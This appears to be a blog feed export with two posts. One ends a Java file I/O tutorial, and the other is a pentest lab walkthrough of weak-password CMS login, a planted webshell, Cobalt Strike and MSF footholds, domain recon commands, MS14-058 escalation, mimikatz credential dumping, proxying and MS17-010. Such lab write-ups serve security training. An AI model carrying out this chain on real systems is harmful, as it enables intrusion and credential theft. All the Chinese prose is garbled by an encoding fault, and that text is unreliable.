alt="image-20211012205656607"></p><p>Java æŠ½è±¡å‡ºäº†ä¸€ä¸ª <code>java.io.FileSystem</code> ä¸åŒçš„æ“ä½œç³»ç»Ÿæœ‰ä¸ä¸€æ ·çš„æ–‡ä»¶ç³»ç»Ÿï¼Œ<code>java.io.UnixFileSystem</code> <code>java.io.WinFileSystem</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012211740019.png" alt="image-20211012211740019"></p><p><code>java.io.FileSystem</code> æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå®ƒæŠ½è±¡äº†å¯¹æ–‡ä»¶çš„æ“ä½œï¼Œä¸åŒæ“ä½œç³»ç»Ÿç‰ˆæœ¬çš„ JDK ä¼šå®ç°å…¶æŠ½è±¡çš„æ–¹æ³•ä»è€Œå°±å®ç°äº†è·¨å¹³å°çš„æ–‡ä»¶è®¿é—®æ“ä½œ</p><p>Java å¯¹æ–‡ä»¶çš„æ“ä½œæœ€ç»ˆéƒ½ä¼šè°ƒç”¨åŠ¨æ€é“¾æ¥åº“ä¸­ C å®ç°çš„ Java Native æ–¹æ³•</p><p><strong>æ³¨æ„</strong></p><ol><li>å¹¶ä¸æ˜¯æ‰€æœ‰çš„æ–‡ä»¶æ“ä½œéƒ½åœ¨ <code>java.io.FileSystem</code> ä¸­å®šä¹‰ï¼Œæ–‡ä»¶çš„è¯»å–æœ€ç»ˆè°ƒç”¨çš„æ˜¯<code>java.io.FileInputStream#read0ã€readBytes</code>ã€<code>java.io.RandomAccessFile#read0ã€readBytes</code>ï¼Œè€Œå†™æ–‡ä»¶è°ƒç”¨çš„æ˜¯<code>java.io.FileOutputStream#writeBytes</code>ã€<code>java.io.RandomAccessFile#write0</code></li><li>Java æœ‰ä¸¤ç±»æ–‡ä»¶ç³»ç»Ÿ APIï¼ŒåŸºäºé˜»å¡æ¨¡å¼çš„ IO çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå¦ä¸€ä¸ªæ˜¯ JDK7 + åŸºäºNIO.2 çš„æ–‡ä»¶ç³»ç»Ÿ</li></ol><h2 id="æµ"><a href="#æµ" class="headerlink" title="æµ"></a>æµ</h2><p>æµæ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µï¼Œæ˜¯å¯¹è¾“å…¥è¾“å‡ºè®¾å¤‡çš„æŠ½è±¡ï¼ŒJava ç¨‹åºä¸­ï¼Œå¯¹äºæ•°æ®çš„ è¾“å…¥/ è¾“å‡º æ“ä½œéƒ½æ˜¯ä»¥æµçš„æ–¹å¼è¿›è¡Œã€‚è®¾å¤‡åŒ…æ‹¬æ–‡ä»¶ï¼Œç½‘ç»œï¼Œå†…å­˜ã€‚æµå…·æœ‰æ–¹å‘æ€§ï¼Œè‡³äºæ˜¯è¾“å…¥æµè¿˜æ˜¯è¾“å‡ºæµåˆ™æ˜¯ä¸€ä¸ªç›¸å¯¹çš„æ¦‚å¿µã€‚å½“ç¨‹åºéœ€è¦ä»æŸä¸ªæ•°æ®æºè¯»å–æ•°æ®çš„æ—¶å€™ï¼Œå°±ä¼šå¼€å¯ä¸€ä¸ªè¾“å…¥æµï¼Œæ•°æ®æºå¯ä»¥æ˜¯æ–‡ä»¶ã€å†…å­˜æˆ–ç½‘ç»œã€‚éœ€è¦å†™å…¥æ•°æ®åˆ°æŸä¸ªæ•°æ®æºç›®çš„åœ°çš„æ—¶å€™ï¼Œä¹Ÿä¼šå¼€å¯ä¸€ä¸ªè¾“å‡ºæµï¼Œè¿™ä¸ªæ•°æ®æºç›®çš„åœ°å¯ä»¥æ˜¯æ–‡ä»¶ã€å†…å­˜æˆ–ç½‘ç»œã€‚</p><p>æµçš„åˆ†ç±»:</p><ol><li>å¤„ç†çš„æ•°æ®å•ä½ä¸åŒå¯åˆ†ä¸ºï¼šå­—ç¬¦æµã€å­—èŠ‚æµ</li><li>æ•°æ®æµæ–¹å‘ä¸åŒå¯åˆ†ä¸ºï¼šè¾“å…¥æµã€è¾“å‡ºæµ</li><li>åŠŸèƒ½ä¸åŒå¯åˆ†ä¸ºï¼šèŠ‚ç‚¹æµã€å¤„ç†æµ</li></ol><p>èŠ‚ç‚¹æµï¼šèŠ‚ç‚¹æµä»ä¸€ä¸ªç‰¹å®šçš„æ•°æ®æºè¯»å†™æ•°æ®ã€‚å³èŠ‚ç‚¹æµæ˜¯ç›´æ¥æ“ä½œæ–‡ä»¶ï¼Œç½‘ç»œç­‰çš„æµï¼Œä¾‹å¦‚<code>FileInputStream</code>å’Œ<code>FileOutputStream</code> ä»–ä»¬ç›´æ¥ä»æ–‡ä»¶ä¸­è¯»å–æˆ–ç½‘æ–‡ä»¶ä¸­å†™å…¥å­—èŠ‚æµã€‚</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013141241721.png" alt="image-20211013141241721"></p><p>å¤„ç†æµï¼šâ€è¿æ¥â€œåœ¨å·²å­˜åœ¨çš„æµï¼ˆèŠ‚ç‚¹æµæˆ–å¤„ç†æµï¼‰ä¹‹ä¸Šé€šè¿‡å¯¹æ•°æ®çš„å¤„ç†ä¸ºç¨‹åºæä¾›æ›´ä¸ºå¼ºå¤§çš„è¯»å†™åŠŸèƒ½ã€‚è¿‡æ»¤æµæ˜¯ä½¿ç”¨ä¸€ä¸ªå·²ç»å­˜åœ¨çš„è¾“å…¥æµæˆ–è¾“å‡ºæµè¿æ¥åˆ›å»ºçš„ï¼Œè¿‡æ»¤æµå°±æ˜¯å¯¹èŠ‚ç‚¹æµè¿›è¡Œä¸€ç³»åˆ—çš„åŒ…è£…ã€‚ä¾‹å¦‚<code>BufferedInputStream</code>å’Œ<code>BufferedOutputStream</code>ï¼Œä½¿ç”¨å·²ç»å­˜åœ¨çš„èŠ‚ç‚¹æµæ¥æ„é€ ï¼Œæä¾›å¸¦ç¼“å†²çš„è¯»å†™ï¼Œæé«˜äº†è¯»å†™çš„æ•ˆç‡ï¼Œä»¥åŠ<code>DataInputStream</code>å’Œ<code>DataOutputStream</code>ï¼Œä½¿ç”¨å·²ç»å­˜åœ¨çš„èŠ‚ç‚¹æµæ¥æ„é€ ï¼Œæä¾›äº†è¯»å†™Javaä¸­çš„åŸºæœ¬æ•°æ®ç±»å‹çš„åŠŸèƒ½ã€‚ä»–ä»¬éƒ½å±äºè¿‡æ»¤æµã€‚</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013141458973.png" alt="image-20211013141458973"></p><p><strong>æµç»“æ„</strong></p><p>Java æ‰€æœ‰çš„æµç±»ä½äº<code>java.io</code>åŒ…ä¸­ï¼Œéƒ½åˆ†åˆ«ç»§æ‰¿ä»¥ä¸‹å››ä¸ªæŠ½è±¡æµç±»å‹</p><table><thead><tr><th></th><th>å­—èŠ‚æµ</th><th>å­—ç¬¦æµ</th></tr></thead><tbody><tr><td>è¾“å…¥æµ</td><td><code>InputStream</code></td><td><code>Reader</code></td></tr><tr><td>è¾“å‡ºæµ</td><td><code>OutputStream</code></td><td><code>Writer</code></td></tr></tbody></table><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013153458771.png" alt="image-20211013153458771"></p><p><strong>å¸¸è§æµ</strong></p><ul><li>ç¼“å†²æµï¼šç¼“å†²æµè¦â€œå¥—æ¥â€åœ¨ç›¸åº”çš„èŠ‚ç‚¹æµä¹‹ä¸Šï¼Œå¯¹è¯»å†™çš„æ•°æ®æä¾›äº†ç¼“å†²çš„åŠŸèƒ½ï¼Œæé«˜äº†è¯»å†™æ•ˆç‡ï¼ŒåŒäº‹å¢åŠ äº†ä¸€äº›æ–°çš„æ–¹æ³•</li><li>è½¬æ¢æµï¼šç”¨äºå­—èŠ‚æ•°æ®åˆ°å­—ç¬¦æ•°æ®ä¹‹é—´çš„è½¬æ¢</li><li>æ•°æ®æµï¼šæä¾›äº†è¯»å†™Javaä¸­çš„åŸºæœ¬æ•°æ®ç±»å‹çš„åŠŸèƒ½</li><li>å¯¹è±¡æµï¼šç”¨äºç›´æ¥å°†å¯¹è±¡å†™å…¥å†™å‡º</li></ul><h2 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h2><blockquote><p>æœ€å¼€å§‹æœ‰ç‚¹ç†è§£é”™è¯¯äº†ï¼Œç›´æ¥å¯¼å…¥ <code>java.io.FileSystem</code> åŒ…å‘ç°ä¸å¯¹ï¼Œåé¢æŸ¥äº†ä¸€ä¸‹å‘ç° <code>java.io.FileSystem</code> æ˜¯æŠ½è±¡ç±»ä¸èƒ½ç›´æ¥è°ƒç”¨è€Œåº”è¯¥è°ƒç”¨ <code>java.io.File</code> ç±» ï¼Œè¿™ä¸ªç±»æ˜¯é€šè¿‡å®ƒå®ç°çš„</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012234012387.png" alt="image-20211012234012387"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012235627129.png" alt="image-20211012235627129"></p><h3 id="å­—ç¬¦æµæ–¹æ³•"><a href="#å­—ç¬¦æµæ–¹æ³•" class="headerlink" title="å­—ç¬¦æµæ–¹æ³•"></a><strong>å­—ç¬¦æµæ–¹æ³•</strong></h3><p>æ–‡ä»¶è¯»å–æ“ä½œ</p><ol><li>å…ˆè·å¾—æ–‡ä»¶å¥æŸ„</li><li>è·å¾—æ–‡ä»¶å¥æŸ„å½“ä½œæ˜¯è¾“å…¥ä¸€ä¸ªå­—èŠ‚ç æµï¼Œéœ€è¦å¯¹è¿™ä¸ªè¾“å…¥æµè¿›è¡Œè¯»å–</li><li>è¯»å–åˆ°è¾“å…¥æµåï¼Œéœ€è¦è¯»å–ç”Ÿæˆå­—èŠ‚æµ</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä½¿ç”¨ BufferedReader çš„ readLine() æ–¹æ³•</span><br><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;E:/test.txt&quot;</span>);<br>        BufferedReader read = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;E:/test.txt&quot;</span>));<br>        String str;<br>        <span class="hljs-keyword">while</span>((str = read.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>            System.out.println(str);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>FileReader </code>ç±»æ˜¯ä» <code>InputStreamReader</code> ç±»ç»§æ‰¿è€Œæ¥ã€‚è¯¥ç±»æŒ‰å­—ç¬¦è¯»å–æµä¸­æ•°æ®</p><p>åœ¨ç»™å®šä»ä¸­è¯»å–æ•°æ®çš„<code>File</code>çš„æƒ…å†µä¸‹åˆ›å»ºä¸€ä¸ª <code>FileReader</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013132110815.png" alt="image-20211013132110815"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013133158759.png" alt="image-20211013133158759"></p><p>æ–‡ä»¶å†™å…¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// BufferedWriter</span><br><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;E:/test.txt&quot;</span>);<br>        BufferedWriter out = <span class="hljs-keyword">new</span> BufferedWriter(<span class="hljs-keyword">new</span> FileWriter(file));<br>        String str = <span class="hljs-string">&quot;æ–‡ä»¶å†™å…¥ï¼ï¼ï¼&quot;</span>;<br>        out.write(str);<br>        out.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>BufferedWriter</code>å±äºå­—ç¬¦æµä½“ç³»ä¸­çš„ä¸€å‘˜ï¼Œä¸ <code>FileWriter</code> ä¸åŒçš„æ˜¯ <code>BufferedWriter</code> è‡ªå¸¦ç¼“å†²åŒº</p></blockquote><p>è¯»å–å’Œå†™å…¥çš„æ“ä½œç±»ä¼¼</p><h3 id="å­—èŠ‚æµæ–¹æ³•"><a href="#å­—èŠ‚æµæ–¹æ³•" class="headerlink" title="å­—èŠ‚æµæ–¹æ³•"></a><strong>å­—èŠ‚æµæ–¹æ³•</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è¯»å–æ–‡ä»¶</span><br><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;E:/test.txt&quot;</span>);<br>        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(file);<br>        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> length = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((length = fileInputStream.read(bytes)) != -<span class="hljs-number">1</span>)&#123;<br>            System.out.println(<span class="hljs-keyword">new</span> String(bytes,<span class="hljs-number">0</span>,length));<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// read æ˜¯è¯»å– bytes é•¿è¯»çš„å­—èŠ‚æ•°</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å†™å…¥æ–‡ä»¶</span><br><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;E:/test.txt&quot;</span>);<br>        FileOutputStream test = <span class="hljs-keyword">new</span> FileOutputStream(file);<br>        String str = <span class="hljs-string">&quot;hello lcdm123!!!&quot;</span>;<br>        <span class="hljs-comment">// å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶</span><br>        <span class="hljs-keyword">byte</span>[] b = str.getBytes();<br>        <span class="hljs-comment">// å†™å…¥</span><br>        test.write(b);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äºæ–‡ä»¶çš„æ“ä½œ Java è¿˜æœ‰å¾ˆå¤šæ–¹æ³•ï¼Œéœ€è¦åé¢é‡åˆ°å†åšå¤„ç†</p><blockquote><p>å¯¹äºå„ç±»çš„æ“ä½œç›´æ¥çœ‹ java æ–‡æ¡£å°±å¯ä»¥äº†</p></blockquote><p>å‚è€ƒæ–‡ç« </p><p><a href="https://blog.csdn.net/u013087513/article/details/51999533">https://blog.csdn.net/u013087513/article/details/51999533</a></p><p><a href="https://segmentfault.com/a/1190000038575475">https://segmentfault.com/a/1190000038575475</a></p><p><a href="https://www.cnblogs.com/shitouer/archive/2012/12/19/2823641.html">https://www.cnblogs.com/shitouer/archive/2012/12/19/2823641.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-æ–‡ä»¶ç³»ç»Ÿ&quot;&gt;&lt;a href=&quot;#Java-æ–‡ä»¶ç³»ç»Ÿ&quot; class=&quot;headerlink&quot; title=&quot;Java æ–‡ä»¶ç³»ç»Ÿ&quot;&gt;&lt;/a&gt;Java æ–‡ä»¶ç³»ç»Ÿ&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="ç¼–ç¨‹è¯­è¨€" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Web" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Web/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>çº¢æ—¥é¶åœºä¸€</title>
    <link href="http://example.com/2021/10/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/"/>
    <id>http://example.com/2021/10/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/</id>
    <published>2021-10-13T11:04:37.000Z</published>
    <updated>2021-10-13T11:05:18.567Z</updated>
    
    <content type="html"><![CDATA[<h1 id="çº¢æ—¥é¶åœº-ä¸€"><a href="#çº¢æ—¥é¶åœº-ä¸€" class="headerlink" title="çº¢æ—¥é¶åœº ä¸€"></a>çº¢æ—¥é¶åœº ä¸€</h1><blockquote><p>ç¯å¢ƒæ­é…æ²¡ä»€ä¹ˆå¤§é—®é¢˜ï¼Œæ”¹ä¸€ä¸‹hostæ–‡ä»¶å°±å¯ä»¥äº†</p></blockquote><h2 id="å¤–ç½‘"><a href="#å¤–ç½‘" class="headerlink" title="å¤–ç½‘"></a>å¤–ç½‘</h2><p>å¼±å£ä»¤è¿›å…¥åå°ï¼Œç„¶åå¯»æ‰¾ getshell çš„çªç ´å£</p><blockquote><p>åå°è·å– shell çš„çªç ´å£å¸¸å¸¸åœ¨ æ’ä»¶å’Œæ¨¡æ¿è¿™äº›åœ°æ–¹</p></blockquote><p>åœ¨æ¨¡æ¿ç¼–è¾‘å¤„å†™å…¥å†°èé©¬</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901175424900.png" alt="image-20210901175424900"></p><p>ç„¶åæ‰¾åˆ°æ¨¡æ¿ä¿å­˜ä½ç½®ï¼Œåˆ©ç”¨å†°èè¿æ¥<code>/yxcms/protected/apps/default/view/default/shell.php</code></p><p>è·å–åˆ° shell åå°±å¯ä»¥è€ƒè™‘ä¸Šçº¿ CS å’Œ MSF äº†ï¼Œå¸¸è§„æ­¥éª¤ï¼Œåˆ©ç”¨ CS å»ºç«‹ç›‘å¬å™¨ï¼Œç„¶åç”Ÿæˆ exeï¼Œä¸Šä¼ åˆ°é¶æœºï¼Œæ‰§è¡Œ exeï¼Œä¹‹åå°±å¯ä»¥ä¸Šçº¿äº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901180914459.png" alt="image-20210901180914459"></p><h2 id="å†…ç½‘"><a href="#å†…ç½‘" class="headerlink" title="å†…ç½‘"></a>å†…ç½‘</h2><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>æŸ¥è¯¢å½“å‰ç”¨æˆ· <code>whoami</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901181220725.png" alt="image-20210901181220725"></p><blockquote><p>è¿™é‡Œçœ‹åˆ°è·å–åˆ°çš„æƒé™æ˜¯ administrator æƒé™ï¼Œ ä½†æ˜¯åœ¨ Windows ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬ææƒçš„ç›®æ ‡æ˜¯ SYSTEM æƒé™</p></blockquote><p>æŸ¥çœ‹IP <code>ipconfig</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901181439936.png" alt="image-20210901181439936"></p><blockquote><p>å­˜åœ¨å†…ç½‘åœ°å€å°±å¯èƒ½æœ‰åŸŸï¼Œå°±ä¼šæ¶‰åŠåˆ°åæœŸçš„åŸŸæ¸—é€</p></blockquote><p><code>net user</code> æœ¬åœ°è´¦æˆ·</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902094457893.png" alt="image-20210902094457893"></p><p>è·å–ç³»ç»Ÿä¿¡æ¯ <code>systeminfo</code> </p><blockquote><p>æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ CS ä¸Šæ²¡æœ‰è¿”å›ç»“æœ ï¼Ÿï¼Ÿï¼Ÿ èšå‰‘å†°èä¸Šé¢ä¹Ÿä¸å¯ä»¥</p></blockquote><p><code>ipconfig /all</code> è¿™æ ·å¯ä»¥æŸ¥çœ‹åˆ°ä¸»æœºæ‰€åœ¨çš„åŸŸ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902092825067.png" alt="image-20210902092825067"></p><p>æŸ¥çœ‹å½“å‰ç™»å½•åŸŸ <code>net config workstation</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902101455030.png" alt="image-20210902101455030"></p><p><code>wmic process get caption,commandline,processid /value</code> æŸ¥çœ‹è¿è¡Œçš„è¿›ç¨‹åŠè·¯å¾„ï¼ˆæ£€æŸ¥æ˜¯å¦æœ‰æ€è½¯ï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902093335151.png" alt="image-20210902093335151"></p><p>å†…ç½‘å­˜æ´»ä¸»æœºæ¢æµ‹ <code> arp-scan.exe -t 10.10.3.0/24</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902095658350.png" alt="image-20210902095658350"></p><blockquote><p>å­˜æ´»çš„ä¸»æœºæœ‰ </p><p>10.10.3.131</p><p>10.10.3.132</p><p>10.10.3.133</p><p>å¯ä»¥é€‰æ‹©å¤šä¸ªå·¥å…·æ‰«æå†…ç½‘æé«˜å‡†ç¡®æ€§</p></blockquote><p><code>ping god.org</code> å‘ç°è¿”å›çš„ IPï¼Œç¡®å®š <code>10.10.3.131</code> æ˜¯åŸŸæ§</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902095939232.png" alt="image-20210902095939232"></p><p><strong>æ¥ä¸‹æ¥å¯ä»¥ä¸»è¦æ”¶é›†åŸŸä¿¡æ¯</strong></p><p>æŸ¥è¯¢åŸŸ <code>net view /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902111026061.png" alt="image-20210902111026061"></p><p>æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº <code>net view /domain:GOD</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902111236537.png" alt="image-20210902111236537"></p><p>åŸŸå†…ç”¨æˆ· <code>net user /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902101310670.png" alt="image-20210902101310670"></p><p>æŸ¥çœ‹åŸŸä¸­çš„ç»„ <code>net group /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902110326635.png" alt="image-20210902110326635"></p><blockquote><p>åé¢å‚è€ƒè¿™ä¸ªæŸ¥çœ‹å„ç»„ä¸­çš„å†…å®¹</p></blockquote><p>åŸŸç®¡ç†å‘˜åˆ—è¡¨ <code>net group &quot;doamin admins&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902102913391.png" alt="image-20210902102913391"></p><p>åŸŸå†…æŸ¥è¯¢åŸŸæ§<code>net group &quot;Domain Controllers&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902102826503.png" alt="image-20210902102826503"></p><p>åŸŸå†…æœåŠ¡å™¨ <code>net group &quot;Domain computer&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902110517911.png" alt="image-20210902110517911"></p><blockquote><p>å…ˆæ”¶é›†è¿™äº›ï¼Œåé¢éœ€è¦ç”¨çš„æ—¶å€™å†æ¥æ”¶é›†ä¸€ä¸‹</p></blockquote><p>è¿˜æœ‰ä¸€ä¸ªé€‰æ‹©å°±æ˜¯ç›´æ¥ä¾é æ’ä»¶ï¼Œä½†æ˜¯å‰æœŸç»ƒä¹ ä¸æ¨èä½¿ç”¨</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901181750768.png" alt="image-20210901181750768"></p><h3 id="è·å–åŸŸæ§æƒé™"><a href="#è·å–åŸŸæ§æƒé™" class="headerlink" title="è·å–åŸŸæ§æƒé™"></a>è·å–åŸŸæ§æƒé™</h3><p>é¦–å…ˆä½¿ç”¨ MS14-058 å°† web é¶æœºææƒ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902112119070.png" alt="image-20210902112119070"></p><p>å¼€å¯è¿œç¨‹æ¡Œé¢ï¼Œæ”¾è¡Œ 3389 ç«¯å£</p><p>ä½¿ç”¨ mimikatz æŠ“å–åˆ°æœ¬åœ°çš„è´¦æˆ·å¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902114020655.png" alt="image-20210902114020655"></p><p>è¿æ¥åˆ°è¿œç¨‹æ¡Œé¢</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902142806122.png" alt="image-20210902142806122"></p><p>ä¸‹ä¸€æ­¥è·å–åŸŸæ§æƒé™</p><blockquote><p>è·å–åŸŸæ§æƒé™çš„æ¼æ´ä¸»è¦æœ‰ MS14-068  MS17-010  CVE-2020-1472  </p><p>æœ€æ–°çš„æ¼æ´ä¹Ÿä¸å¤ªäº†è§£</p></blockquote><p>å¯ä»¥å…ˆæ­å»ºå†…ç½‘ä»£ç†ï¼Œä½¿ kali èƒ½å¤Ÿè®¿é—®åˆ°åŸŸæ§ï¼Œè¿™é‡Œé€‰ç”¨ EW</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902115415971.png" alt="image-20210902115415971"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902115405766.png" alt="image-20210902115405766"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902115536863.png" alt="image-20210902115536863"></p><blockquote><p>è¿æ¥æˆåŠŸï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨ kali è®¿é—®åˆ°åŸŸæ§æœåŠ¡å™¨äº†</p></blockquote><p>å…ˆä¸º msf è®¾ç½®ä»£ç†</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">setg Proxies socks5:<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.15</span>:<span class="hljs-number">6000</span><br>setg ReverseAllowProxy <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ MS17-010 æ‰§è¡Œå‘½ä»¤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902121355745.png" alt="image-20210902121355745"></p><p><del>å°è¯•æ·»åŠ ç”¨æˆ·å¹¶ä¸”å¼€å¯è¿œç¨‹æ¡Œé¢</del> 